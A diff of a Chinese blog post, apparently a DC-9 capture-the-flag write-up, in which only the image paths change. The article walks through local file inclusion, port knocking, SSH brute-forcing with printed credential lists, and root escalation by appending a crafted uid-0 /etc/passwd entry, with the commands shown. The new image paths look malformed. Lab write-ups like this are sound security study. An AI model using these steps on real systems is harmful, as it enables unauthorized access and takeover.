@@ -41,29 +41,29 @@
 <meta property="og:url" content="http://example.com/posts/73305909/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/73305909/file_include_etcpasswd.png">
-<meta property="og:image" content="http://example.com/posts/73305909/Wappalyzer.png">
-<meta property="og:image" content="http://example.com/posts/73305909/apache.png">
-<meta property="og:image" content="http://example.com/posts/73305909/intruder.png">
-<meta property="og:image" content="http://example.com/posts/73305909/ssh_connect_error.png">
-<meta property="og:image" content="http://example.com/posts/73305909/knockd_conf.png">
-<meta property="og:image" content="http://example.com/posts/73305909/ssh_connect.png">
-<meta property="og:image" content="http://example.com/posts/73305909/hydra1.png">
-<meta property="og:image" content="http://example.com/posts/73305909/ssh1.png">
-<meta property="og:image" content="http://example.com/posts/73305909/hydra2.png">
-<meta property="og:image" content="http://example.com/posts/73305909/fredf_sudo.png">
-<meta property="og:image" content="http://example.com/posts/73305909/testpy.png">
-<meta property="og:image" content="http://example.com/posts/73305909/find_test.png">
-<meta property="og:image" content="http://example.com/posts/73305909/testpy1.png">
-<meta property="og:image" content="http://example.com/posts/73305909/usercreate_error.png">
-<meta property="og:image" content="http://example.com/posts/73305909/usercreate.png">
-<meta property="og:image" content="http://example.com/posts/73305909/flag.png">
+<meta property="og:image" content="http://example.com/.com//file_include_etcpasswd.png">
+<meta property="og:image" content="http://example.com/.com//Wappalyzer.png">
+<meta property="og:image" content="http://example.com/.com//apache.png">
+<meta property="og:image" content="http://example.com/.com//intruder.png">
+<meta property="og:image" content="http://example.com/.com//ssh_connect_error.png">
+<meta property="og:image" content="http://example.com/.com//knockd_conf.png">
+<meta property="og:image" content="http://example.com/.com//ssh_connect.png">
+<meta property="og:image" content="http://example.com/.com//hydra1.png">
+<meta property="og:image" content="http://example.com/.com//ssh1.png">
+<meta property="og:image" content="http://example.com/.com//hydra2.png">
+<meta property="og:image" content="http://example.com/.com//fredf_sudo.png">
+<meta property="og:image" content="http://example.com/.com//testpy.png">
+<meta property="og:image" content="http://example.com/.com//find_test.png">
+<meta property="og:image" content="http://example.com/.com//testpy1.png">
+<meta property="og:image" content="http://example.com/.com//usercreate_error.png">
+<meta property="og:image" content="http://example.com/.com//usercreate.png">
+<meta property="og:image" content="http://example.com/.com//flag.png">
 <meta property="article:published_time" content="2021-05-10T14:29:13.000Z">
 <meta property="article:modified_time" content="2021-05-11T04:58:13.300Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="DCchallenges">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/73305909/file_include_etcpasswd.png">
+<meta name="twitter:image" content="http://example.com/.com//file_include_etcpasswd.png">
 
 <link rel="canonical" href="http://example.com/posts/73305909/">
 
@@ -362,53 +362,53 @@
 </blockquote>
 <p>去<code>manage.php</code>登录下试试,成功登录</p>
 <p>页面左下角有一个<code> File does not exist</code>推测有本地文件包含漏洞</p>
-<p><img src="file_include_etcpasswd.png"></p>
-<p><img src="Wappalyzer.png"></p>
+<p><img src="/.com//file_include_etcpasswd.png"></p>
+<p><img src="/.com//Wappalyzer.png"></p>
 <p>使用的apache</p>
-<p><img src="apache.png"></p>
+<p><img src="/.com//apache.png"></p>
 <p>用burp 爆破了下LFI字典 没发现有用的信息</p>
-<p><img src="intruder.png"></p>
+<p><img src="/.com//intruder.png"></p>
 <p>去试试之前跑出来的用户账号能不能ssh登录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#passwd</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>
 
-<p><img src="ssh_connect_error.png"></p>
+<p><img src="/.com//ssh_connect_error.png"></p>
 <p>发现全是连接失败，但是nmap扫描端口的时候22端口是开放的</p>
 <p>网上搜了下，这是使用的<strong>knock服务(端口敲门服务)</strong> </p>
 <h3 id="knock服务"><a href="#knock服务" class="headerlink" title="knock服务"></a>knock服务</h3><p>Knockd的配置文件路径为<code>/etc/knockd.conf</code></p>
-<p><img src="knockd_conf.png"></p>
+<p><img src="/.com//knockd_conf.png"></p>
 <p>开放了<code>7469</code>,<code>8475</code>,<code>9842</code>三个端口</p>
 <p>在默认情况下，22端口是关闭的，只有访问了以上三个端口后，22端口才会开放。</p>
 <p>使用nmap访问以上三个端口</p>
 <p>访问后在去连接ssh，ssh端口可以访问</p>
-<p><img src="ssh_connect.png"></p>
-<p><img src="hydra1.png"></p>
+<p><img src="/.com//ssh_connect.png"></p>
+<p><img src="/.com//hydra1.png"></p>
 <p>最后试出了三组可以ssh登录的账号</p>
 <blockquote>
 <p>chandlerb   UrAG0D!<br>joeyt       Passw0rd<br>janitor     Ilovepeepee</p>
 </blockquote>
-<p><img src="ssh1.png"></p>
+<p><img src="/.com//ssh1.png"></p>
 <p>在<code>janitor</code>用户下发现一个隐藏文件夹，里面包含一个密码本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># passwords-found-on-post-it-notes.txt </span><br><span class="line"></span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
 
-<p><img src="hydra2.png"></p>
+<p><img src="/.com//hydra2.png"></p>
 <p>跑出了一个账号</p>
 <p><code>fredf</code> <code>B4-Tru3-001</code></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="fredf_sudo.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/.com//fredf_sudo.png"></p>
 <p>不需要密码可以执行<code>/opt/devstuff/dist/test/test</code></p>
-<p><img src="testpy.png"></p>
+<p><img src="/.com//testpy.png"></p>
 <p>提示test是个py文件</p>
 <p>找一下test.py</p>
 <p><code>find / -name &quot;test.py&quot; 2&gt;/dev/null</code></p>
-<p><img src="find_test.png"></p>
+<p><img src="/.com//find_test.png"></p>
 <p>发现两个文件</p>
 <blockquote>
 <p>/opt/devstuff/test.py<br>/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
 </blockquote>
 <p>估计只有第一个可以用得上</p>
 <p><code>cat /opt/devstuff/test.py</code></p>
-<p><img src="testpy1.png"></p>
+<p><img src="/.com//testpy1.png"></p>
 <p>需要两个参数，把第一个参数的内容追加到第二个文件中</p>
 <p>使用openssl创建一个用户</p>
 <p><code> openssl  passwd -1 -salt Mamor 123456</code><br><code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
@@ -418,11 +418,11 @@
 <p>sudo ./test /tmp/mamor /etc/passswd</p>
 <p>构造失败没法写入</p>
 <p><code>cat  /tmp/mamor </code></p>
-<p><img src="usercreate_error.png"></p>
+<p><img src="/.com//usercreate_error.png"></p>
 <p>发现写入的数据并不是原数据</p>
 <p>换<code>&#39;</code>试试</p>
 <p><code>echo &#39;Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash&#39; &gt; /tmp/mamor1</code></p>
-<p><img src="usercreate.png"></p>
+<p><img src="/.com//usercreate.png"></p>
 <p>还是没法写入</p>
 <p><code>openssl passwd -1 -salt test test</code></p>
 <blockquote>
@@ -435,7 +435,7 @@
 <p>test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
 </blockquote>
 <p>这次写入成功</p>
-<p><img src="flag.png"></p>
+<p><img src="/.com//flag.png"></p>
 
     </div>
 
